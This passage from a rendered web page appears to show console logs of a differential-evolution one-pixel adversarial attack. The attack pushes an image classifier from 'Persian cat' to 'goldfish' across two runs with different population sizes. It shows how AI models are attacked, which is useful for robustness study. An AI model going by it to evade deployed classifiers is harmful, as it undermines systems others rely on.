class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br></pre></td><td class="code"><pre><span class="line">(&#39;Persian cat&#39;, 0.265370637178421)</span><br><span class="line"></span><br><span class="line"> ### Starting DE Attack 1 ###</span><br><span class="line"></span><br><span class="line">Initializing Differential Evolution</span><br><span class="line">Initializing fitness:  40</span><br><span class="line"></span><br><span class="line"> # iter:  1 best fitness:  0.2792421304038726 best solution:  [ 39  15  57 207  64]</span><br><span class="line">    - F:  0.6766003777597516</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  15</span><br><span class="line">    ğŸ”µ new best fitness:  0.24962108858744614  new best solution:  [ 13  37  12  55 187]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Siamese cat&#39;, 0.1373663693666458)</span><br><span class="line">    - mean fitness:  0.3119236789265415</span><br><span class="line"> # iter:  2 best fitness:  0.24962108858744614 best solution:  [ 13  37  12  55 187]</span><br><span class="line">    - F:  0.6662005326545324</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  14</span><br><span class="line">    - mean fitness:  0.30659447693833497</span><br><span class="line"> # iter:  3 best fitness:  0.24962108858744614 best solution:  [ 13  37  12  55 187]</span><br><span class="line">    - F:  0.656100186679759</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  18</span><br><span class="line">    ğŸ”µ new best fitness:  0.2070837609935552  new best solution:  [  8  30  91  66 239]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.09145677834749222)</span><br><span class="line">    - mean fitness:  0.2969437881693011</span><br><span class="line"> # iter:  4 best fitness:  0.2070837609935552 best solution:  [  8  30  91  66 239]</span><br><span class="line">    - F:  0.6462870241393159</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  12</span><br><span class="line">    - mean fitness:  0.29271303782225006</span><br><span class="line"> # iter:  5 best fitness:  0.2070837609935552 best solution:  [  8  30  91  66 239]</span><br><span class="line">    - F:  0.6367493783259498</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  10</span><br><span class="line">    - mean fitness:  0.2910425961643341</span><br><span class="line"> # iter:  6 best fitness:  0.2070837609935552 best solution:  [  8  30  91  66 239]</span><br><span class="line">    - F:  0.6274761901752574</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  7</span><br><span class="line">    - mean fitness:  0.2881202471602592</span><br><span class="line"> # iter:  7 best fitness:  0.2070837609935552 best solution:  [  8  30  91  66 239]</span><br><span class="line">    - F:  0.6184569699902873</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  8</span><br><span class="line">    ğŸ”µ new best fitness:  0.1985895600519143  new best solution:  [  8  30  83  43 246]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.0852014571428299)</span><br><span class="line">    - mean fitness:  0.2845774589579378</span><br><span class="line"> # iter:  8 best fitness:  0.1985895600519143 best solution:  [  8  30  83  43 246]</span><br><span class="line">    - F:  0.6096817619774788</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  10</span><br><span class="line">    ğŸ”µ new best fitness:  0.1980369116354268  new best solution:  [ 19  31 221  60 219]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.12450581043958664)</span><br><span class="line">    - mean fitness:  0.2800736110439175</span><br><span class="line"> # iter:  9 best fitness:  0.1980369116354268 best solution:  [ 19  31 221  60 219]</span><br><span class="line">    - F:  0.6011411113590921</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  9</span><br><span class="line">    - mean fitness:  0.2778595529278391</span><br><span class="line"> # iter:  10 best fitness:  0.1980369116354268 best solution:  [ 19  31 221  60 219]</span><br><span class="line">    - F:  0.5928260338492048</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  6</span><br><span class="line">    - mean fitness:  0.27586468316367246</span><br><span class="line"> # iter:  11 best fitness:  0.1980369116354268 best solution:  [ 19  31 221  60 219]</span><br><span class="line">    - F:  0.5847279872999954</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  7</span><br><span class="line">    - mean fitness:  0.2737868920994515</span><br><span class="line"> # iter:  12 best fitness:  0.1980369116354268 best solution:  [ 19  31 221  60 219]</span><br><span class="line">    - F:  0.5768388453426972</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  10</span><br><span class="line">    - mean fitness:  0.27152785387224865</span><br><span class="line"> # iter:  13 best fitness:  0.1980369116354268 best solution:  [ 19  31 221  60 219]</span><br><span class="line">    - F:  0.5691508728634869</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  5</span><br><span class="line">    ğŸ”µ new best fitness:  0.19654489058302715  new best solution:  [  8  30  83  43 232]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.08681343495845795)</span><br><span class="line">    - mean fitness:  0.26959856572939317</span><br><span class="line"> # iter:  14 best fitness:  0.19654489058302715 best solution:  [  8  30  83  43 232]</span><br><span class="line">    - F:  0.561656703168862</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  8</span><br><span class="line">    - mean fitness:  0.26641814589238494</span><br><span class="line"> # iter:  15 best fitness:  0.19654489058302715 best solution:  [  8  30  83  43 232]</span><br><span class="line">    - F:  0.5543493167079622</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  5</span><br><span class="line">    - mean fitness:  0.2645324606302893</span><br><span class="line"> # iter:  16 best fitness:  0.19654489058302715 best solution:  [  8  30  83  43 232]</span><br><span class="line">    - F:  0.5472220212308999</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  9</span><br><span class="line">    ğŸ”µ new best fitness:  0.18593154309201054  new best solution:  [ 13  32  12  10 187]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.08130055665969849)</span><br><span class="line">    - mean fitness:  0.25822097945274436</span><br><span class="line"> # iter:  17 best fitness:  0.18593154309201054 best solution:  [ 13  32  12  10 187]</span><br><span class="line">    - F:  0.5402684332726887</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  5</span><br><span class="line">    - mean fitness:  0.25611360947732464</span><br><span class="line"> # iter:  18 best fitness:  0.18593154309201054 best solution:  [ 13  32  12  10 187]</span><br><span class="line">    - F:  0.533482460861836</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  3</span><br><span class="line">    - mean fitness:  0.2554245814695605</span><br><span class="line"> # iter:  19 best fitness:  0.18593154309201054 best solution:  [ 13  32  12  10 187]</span><br><span class="line">    - F:  0.5268582873612809</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  5</span><br><span class="line">    - mean fitness:  0.25354099731121094</span><br><span class="line"> # iter:  20 best fitness:  0.18593154309201054 best solution:  [ 13  32  12  10 187]</span><br><span class="line">    - F:  0.52039035635713</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  6</span><br><span class="line">    - mean fitness:  0.25284817432111595</span><br><span class="line"> # iter:  21 best fitness:  0.18593154309201054 best solution:  [ 13  32  12  10 187]</span><br><span class="line">    - F:  0.5140733575177235</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  7</span><br><span class="line">    - mean fitness:  0.24981836683436995</span><br><span class="line"> # iter:  22 best fitness:  0.18593154309201054 best solution:  [ 13  32  12  10 187]</span><br><span class="line">    - F:  0.507902213351963</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  5</span><br><span class="line">    - mean fitness:  0.2459833693370456</span><br><span class="line"> # iter:  23 best fitness:  0.18593154309201054 best solution:  [ 13  32  12  10 187]</span><br><span class="line">    - F:  0.5018720668016673</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  4</span><br><span class="line">    - mean fitness:  0.24333137386493037</span><br><span class="line"> # iter:  24 best fitness:  0.18593154309201054 best solution:  [ 13  32  12  10 187]</span><br><span class="line">    - F:  0.49597826960801883</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  6</span><br><span class="line">    ğŸ”µ new best fitness:  0.17529693761025555  new best solution:  [ 19  33 107 202  87]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.11591507494449615)</span><br><span class="line">    - mean fitness:  0.23850348221239984</span><br><span class="line"> # iter:  25 best fitness:  0.17529693761025555 best solution:  [ 19  33 107 202  87]</span><br><span class="line">    - F:  0.49021637139698715</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  4</span><br><span class="line">    ğŸ”µ new best fitness:  0.16616633877856657  new best solution:  [ 8 30 91 31 67]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.09061149507761002)</span><br><span class="line">    - mean fitness:  0.23500263207024547</span><br><span class="line"> # iter:  26 best fitness:  0.16616633877856657 best solution:  [ 8 30 91 31 67]</span><br><span class="line">    - F:  0.48458210943301233</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  1</span><br><span class="line">    ğŸ”µ new best fitness:  0.1616513744520489  new best solution:  [ 19  28   5 102  29]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.10139482468366623)</span><br><span class="line">    - mean fitness:  0.23261223865411013</span><br><span class="line"> # iter:  27 best fitness:  0.1616513744520489 best solution:  [ 19  28   5 102  29]</span><br><span class="line">    - F:  0.479071398994239</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  5</span><br><span class="line">    ğŸ”µ new best fitness:  0.14602759646368213  new best solution:  [ 16  34   1   3 205]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.07026080787181854)</span><br><span class="line">    - mean fitness:  0.22903343415091512</span><br><span class="line"> # iter:  28 best fitness:  0.14602759646368213 best solution:  [ 16  34   1   3 205]</span><br><span class="line">    - F:  0.4736803243262472</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  5</span><br><span class="line">    - mean fitness:  0.22653961733085454</span><br><span class="line"> # iter:  29 best fitness:  0.14602759646368213 best solution:  [ 16  34   1   3 205]</span><br><span class="line">    - F:  0.46840513013457596</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  4</span><br><span class="line">    - mean fitness:  0.22535609000551632</span><br><span class="line"> # iter:  30 best fitness:  0.14602759646368213 best solution:  [ 16  34   1   3 205]</span><br><span class="line">    - F:  0.46324221357937834</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  1</span><br><span class="line">    - mean fitness:  0.2251134257450758</span><br><span class="line"> # iter:  31 best fitness:  0.14602759646368213 best solution:  [ 16  34   1   3 205]</span><br><span class="line">    - F:  0.45818811673835536</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  4</span><br><span class="line">    - mean fitness:  0.22436150974099292</span><br><span class="line"> # iter:  32 best fitness:  0.14602759646368213 best solution:  [ 16  34   1   3 205]</span><br><span class="line">    - F:  0.4532395195066663</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  3</span><br><span class="line">    - mean fitness:  0.2225118848582497</span><br><span class="line"> # iter:  33 best fitness:  0.14602759646368213 best solution:  [ 16  34   1   3 205]</span><br><span class="line">    - F:  0.4483932329048621</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  3</span><br><span class="line">    - mean fitness:  0.2216588508694258</span><br><span class="line"> # iter:  34 best fitness:  0.14602759646368213 best solution:  [ 16  34   1   3 205]</span><br><span class="line">    - F:  0.44364619276804285</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  4</span><br><span class="line">    - mean fitness:  0.22057820814152365</span><br><span class="line"> # iter:  35 best fitness:  0.14602759646368213 best solution:  [ 16  34   1   3 205]</span><br><span class="line">    - F:  0.43899545379140953</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  1</span><br><span class="line">    - mean fitness:  0.21989876355437446</span><br><span class="line"> # iter:  36 best fitness:  0.14602759646368213 best solution:  [ 16  34   1   3 205]</span><br><span class="line">    - F:  0.4344381839091998</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  2</span><br><span class="line">    - mean fitness:  0.2197925534543174</span><br><span class="line"> # iter:  37 best fitness:  0.14602759646368213 best solution:  [ 16  34   1   3 205]</span><br><span class="line">    - F:  0.4299716589856594</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  3</span><br><span class="line">    - mean fitness:  0.218737456479721</span><br><span class="line"> # iter:  38 best fitness:  0.14602759646368213 best solution:  [ 16  34   1   3 205]</span><br><span class="line">    - F:  0.42559325779824</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  1</span><br><span class="line">    ğŸ”µ new best fitness:  0.14172421832336113  new best solution:  [ 19  33  30 202  87]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.08732357621192932)</span><br><span class="line">    - mean fitness:  0.21789813849754863</span><br><span class="line"> # iter:  39 best fitness:  0.14172421832336113 best solution:  [ 19  33  30 202  87]</span><br><span class="line">    - F:  0.4213004572946206</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  3</span><br><span class="line">    - mean fitness:  0.21529108281320078</span><br><span class="line"> # iter:  40 best fitness:  0.14172421832336113 best solution:  [ 19  33  30 202  87]</span><br><span class="line">    - F:  0.4170908281064568</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  5</span><br><span class="line">    - mean fitness:  0.21383756285431446</span><br><span class="line"> # iter:  41 best fitness:  0.14172421832336113 best solution:  [ 19  33  30 202  87]</span><br><span class="line">    - F:  0.4129620303039511</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  6</span><br><span class="line">    ğŸ”µ new best fitness:  0.13738378579728305  new best solution:  [ 9 34  0 26 64]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.07210958003997803)</span><br><span class="line">    - mean fitness:  0.20868932269731885</span><br><span class="line"> # iter:  42 best fitness:  0.13738378579728305 best solution:  [ 9 34  0 26 64]</span><br><span class="line">    - F:  0.40891180937645544</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  4</span><br><span class="line">    - mean fitness:  0.2078212516120402</span><br><span class="line"> # iter:  43 best fitness:  0.13738378579728305 best solution:  [ 9 34  0 26 64]</span><br><span class="line">    - F:  0.4049379924253286</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  3</span><br><span class="line">    - mean fitness:  0.20408854874112875</span><br><span class="line"> # iter:  44 best fitness:  0.13738378579728305 best solution:  [ 9 34  0 26 64]</span><br><span class="line">    - F:  0.40103848455621577</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  0</span><br><span class="line">    - mean fitness:  0.20408854874112875</span><br><span class="line"> # iter:  45 best fitness:  0.13738378579728305 best solution:  [ 9 34  0 26 64]</span><br><span class="line">    - F:  0.39721126545879254</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  1</span><br><span class="line">    - mean fitness:  0.20378129609016468</span><br><span class="line"> # iter:  46 best fitness:  0.13738378579728305 best solution:  [ 9 34  0 26 64]</span><br><span class="line">    - F:  0.39345438616281747</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  3</span><br><span class="line">    ğŸ”µ new best fitness:  0.1299925823986996  new best solution:  [ 19  28   5 102  82]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.07040903717279434)</span><br><span class="line">    - mean fitness:  0.20264634452323663</span><br><span class="line"> # iter:  47 best fitness:  0.1299925823986996 best solution:  [ 19  28   5 102  82]</span><br><span class="line">    - F:  0.3897659659600848</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  2</span><br><span class="line">    - mean fitness:  0.20154688280672417</span><br><span class="line"> # iter:  48 best fitness:  0.1299925823986996 best solution:  [ 19  28   5 102  82]</span><br><span class="line">    - F:  0.3861441894825582</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  5</span><br><span class="line">    ğŸ”µ new best fitness:  0.1224242995667737  new best solution:  [ 19  28  42  26 126]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.055999837815761566)</span><br><span class="line">    - mean fitness:  0.19660467324938508</span><br><span class="line"> # iter:  49 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.38258730392760887</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  2</span><br><span class="line">    - mean fitness:  0.1962674061607686</span><br><span class="line"> # iter:  50 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.37909361642187034</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  4</span><br><span class="line">    - mean fitness:  0.1943786095136602</span><br><span class="line"> # iter:  51 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.3756614915157772</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  6</span><br><span class="line">    - mean fitness:  0.19027078175422502</span><br><span class="line"> # iter:  52 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.37228934880136033</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  1</span><br><span class="line">    - mean fitness:  0.18975930064043495</span><br><span class="line"> # iter:  53 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.3689756606463516</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  3</span><br><span class="line">    - mean fitness:  0.18946195252865436</span><br><span class="line"> # iter:  54 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.3657189500380862</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  1</span><br><span class="line">    - mean fitness:  0.18909707230777711</span><br><span class="line"> # iter:  55 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.36251778853110245</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  2</span><br><span class="line">    - mean fitness:  0.1873159199443762</span><br><span class="line"> # iter:  56 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.359370794292723</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  5</span><br><span class="line">    - mean fitness:  0.18381733766582328</span><br><span class="line"> # iter:  57 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.35627663024124995</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  2</span><br><span class="line">    - mean fitness:  0.1830537809233647</span><br><span class="line"> # iter:  58 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.3532340022717441</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  1</span><br><span class="line">    - mean fitness:  0.18271953661824228</span><br><span class="line"> # iter:  59 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.3502416575646581</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  2</span><br><span class="line">    - mean fitness:  0.18242792503733654</span><br><span class="line"> # iter:  60 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.34729838297288895</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  6</span><br><span class="line">    - mean fitness:  0.18039965996067622</span><br><span class="line"> # iter:  61 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.3444030034830755</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  1</span><br><span class="line">    - mean fitness:  0.18006657009755145</span><br><span class="line"> # iter:  62 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.34155438074722033</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  2</span><br><span class="line">    - mean fitness:  0.179565512255067</span><br><span class="line"> # iter:  63 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.3387514116809485</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  2</span><br><span class="line">    - mean fitness:  0.17945913075454883</span><br><span class="line"> # iter:  64 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.3359930271249306</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  3</span><br><span class="line">    - mean fitness:  0.17832086661219365</span><br><span class="line"> # iter:  65 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.3332781905662051</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  0</span><br><span class="line">    - mean fitness:  0.17832086661219365</span><br><span class="line"> # iter:  66 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.3306058969163208</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  2</span><br><span class="line">    - mean fitness:  0.1771787651014165</span><br><span class="line"> # iter:  67 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.3279751713434023</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  1</span><br><span class="line">    - mean fitness:  0.17541003143414854</span><br><span class="line"> # iter:  68 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.3253850681554063</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  5</span><br><span class="line">    - mean fitness:  0.17219932818989037</span><br><span class="line"> # iter:  69 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.32283466973198904</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  1</span><br><span class="line">    - mean fitness:  0.17194998578561355</span><br><span class="line"> # iter:  70 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.32032308550255917</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  1</span><br><span class="line">    - mean fitness:  0.1713867742641014</span><br><span class="line"> # iter:  71 best fitness:  0.1224242995667737 best solution:  [ 19  28  42  26 126]</span><br><span class="line">    - F:  0.31784945096821904</span><br><span class="line">    - vec:  40</span><br><span class="line">    - changed vec num:  3</span><br><span class="line">    ğŸ”µ new best fitness:  0.1114595357212238  new best solution:  [  9  30  15  26 105]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;goldfish&#39;, 0.07046791166067123)</span><br><span class="line">    - mean fitness:  0.1694240938144503</span><br><span class="line"></span><br><span class="line">ğŸŸ¢ Holy shit, solution found! Now it&#39;s a  goldfish with probability 0.07046791166067123</span><br></pre></td></tr></table></figure>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        alpha=0.4ï¼ŒpopSize=200ï¼ŒmaxIter=100    </div>    <div class='spoiler-content'>        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">(&#39;Persian cat&#39;, 0.265370637178421)</span><br><span class="line"></span><br><span class="line"> ### Starting DE Attack 1 ###      </span><br><span class="line"></span><br><span class="line">Initializing Differential Evolution</span><br><span class="line">Initializing fitness:  200</span><br><span class="line"></span><br><span class="line"> # iter:  1 best fitness:  0.24225685829878785 best solution:  [ 12  39  95 221 124]</span><br><span class="line">    - F:  0.6766003777597516</span><br><span class="line">    - vec:  200</span><br><span class="line">    - changed vec num:  106</span><br><span class="line">    ğŸ”µ new best fitness:  0.14112568460404873  new best solution:  [ 22  32 143 101   2]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;Persian cat&#39;, 0.08040182292461395)</span><br><span class="line">    - mean fitness:  0.3115253244334599</span><br><span class="line"> # iter:  2 best fitness:  0.14112568460404873 best solution:  [ 22  32 143 101   2]</span><br><span class="line">    - F:  0.6662005326545324</span><br><span class="line">    - vec:  200</span><br><span class="line">    - changed vec num:  70</span><br><span class="line">    - mean fitness:  0.3050887870359293</span><br><span class="line"> # iter:  3 best fitness:  0.14112568460404873 best solution:  [ 22  32 143 101   2]</span><br><span class="line">    - F:  0.656100186679759</span><br><span class="line">    - vec:  200</span><br><span class="line">    - changed vec num:  63</span><br><span class="line">    - mean fitness:  0.30018534842150985</span><br><span class="line"> # iter:  4 best fitness:  0.14112568460404873 best solution:  [ 22  32 143 101   2]</span><br><span class="line">    - F:  0.6462870241393159</span><br><span class="line">    - vec:  200</span><br><span class="line">    - changed vec num:  61</span><br><span class="line">    - mean fitness:  0.2930651634036622</span><br><span class="line"> # iter:  5 best fitness:  0.14112568460404873 best solution:  [ 22  32 143 101   2]</span><br><span class="line">    - F:  0.6367493783259498</span><br><span class="line">    - vec:  200</span><br><span class="line">    - changed vec num:  48</span><br><span class="line">    - mean fitness:  0.2894190900228568</span><br><span class="line"> # iter:  6 best fitness:  0.14112568460404873 best solution:  [ 22  32 143 101   2]</span><br><span class="line">    - F:  0.6274761901752574</span><br><span class="line">    - vec:  200</span><br><span class="line">    - changed vec num:  45</span><br><span class="line">    - mean fitness:  0.2862749499891652</span><br><span class="line"> # iter:  7 best fitness:  0.14112568460404873 best solution:  [ 22  32 143 101   2]</span><br><span class="line">    - F:  0.6184569699902873</span><br><span class="line">    - vec:  200</span><br><span class="line">    - changed vec num:  34</span><br><span class="line">    - mean fitness:  0.283543661233125</span><br><span class="line"> # iter:  8 best fitness:  0.14112568460404873 best solution:  [ 22  32 143 101   2]</span><br><span class="line">    - F:  0.6096817619774788</span><br><span class="line">    - vec:  200</span><br><span class="line">    - changed vec num:  34</span><br><span class="line">    - mean fitness:  0.28058190911469866</span><br><span class="line"> # iter:  9 best fitness:  0.14112568460404873 best solution:  [ 22  32 143 101   2]</span><br><span class="line">    - F:  0.6011411113590921</span><br><span class="line">    - vec:  200</span><br><span class="line">    - changed vec num:  34</span><br><span class="line">    - mean fitness:  0.27765514108512435</span><br><span class="line"> # iter:  10 best fitness:  0.14112568460404873 best solution:  [ 22  32 143 101   2]</span><br><span class="line">    - F:  0.5928260338492048</span><br><span class="line">    - vec:  200</span><br><span class="line">    - changed vec num:  27</span><br><span class="line">    - mean fitness:  0.275277993111813</span><br><span class="line"> # iter:  11 best fitness:  0.14112568460404873 best solution:  [ 22  32 143 101   2]</span><br><span class="line">    - F:  0.5847279872999954</span><br><span class="line">    - vec:  200</span><br><span class="line">    - changed vec num:  25</span><br><span class="line">    ğŸ”µ new best fitness:  0.12863419004133902  new best solution:  [  8  31  29  26 118]</span><br><span class="line">    ğŸ”µ prediction:  (&#39;goldfish&#39;, 0.0704464316368103)</span><br><span class="line">    - mean fitness:  0.27182799993403023</span><br><span class="line"></span><br><span class="line">ğŸŸ¢ Holy shit, solution found! Now it&#39;s a  goldfish with probability 0.0704464316368103</span><br></pre></td></tr></table></figure>    